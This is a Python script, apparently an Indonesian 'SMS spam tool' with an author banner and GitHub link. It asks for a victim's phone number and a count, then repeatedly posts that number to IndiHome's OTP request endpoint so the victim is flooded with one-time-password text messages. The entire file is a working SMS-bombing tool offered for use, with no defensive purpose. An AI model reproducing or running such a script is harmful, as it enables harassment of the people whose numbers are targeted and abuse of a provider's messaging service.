#TOOLS SPAM SMS INDIHOME BY MR.Q
#DILARANG COPYRIGHT
import os,sys,time,requests
from requests import post
s = requests.Session()
os.system("clear")
def balik():
    f = input("\033[1;97mKEMBALI?\033[90m (y/t):\033[1;92m ")
    if f == "y":
       os.system("python indi.py")
    elif f == "t":
         print ("\033[1;91mEXIT!!\033[1;97m")
         sys.exit()
    else:
         print ("\033[1;91mWRONG INPUT!!\033[1;97m")
         time.sleep(2)
         balik()
os.system("figlet SPAM SMS |lolcat")
os.system("figlet -f small INDIHOME |lolcat")
banner = """
\033[1;94m___________________________________________
\033[1;97m AUTHOR :\033[1;92m MR.Q
\033[1;97m YOUTUBE:\033[1;92m JOKY WORG
\033[1;97m GITHUB :\033[1;92m https://github.com/Jokyworg
\033[1;94m___________________________________________
"""
print (banner)
print ("\033[90m[\033[1;94m+\033[90m]\033[1;92m==========\033[90mTOOLS BY\033[1;94mJOKY WORG\033[1;92m=========\033[90m[\033[1;94m+\033[90m]")
no = input("\033[1;97mMASUKAN NOMOR:\033[1;92m ")
jum = int(input("\033[1;97mJUMLAH SPAM:\033[1;92m "))
url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
ua = {
"Host": "sobat.indihome.co.id",
"Connection": "keep-alive",
"Accept": "*/*",
"user-agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
}

dat = {
"type":"hp",

"msisdn": no
}
for i in range(jum):
    r = s.post(url, data=dat, headers=ua)
    print ("\033[1;97mMESSAGE:\033[1;92m", r.json()["info"])
balik()
